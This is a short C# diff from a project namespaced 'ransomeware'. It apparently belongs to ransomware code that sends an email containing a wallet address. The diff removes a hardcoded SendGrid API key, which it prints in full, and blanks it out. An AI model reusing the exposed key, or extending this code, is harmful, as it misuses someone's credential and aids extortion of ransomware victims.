@@ -126,7 +126,7 @@ namespace ransomeware
 
         static async Task<bool> SendEmail(string sendto, string wallet)
         {
-            var apiKey = "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";
+            var apiKey = "";
             var client = new SendGridClient(apiKey);
             var msg = new SendGridMessage()
             {
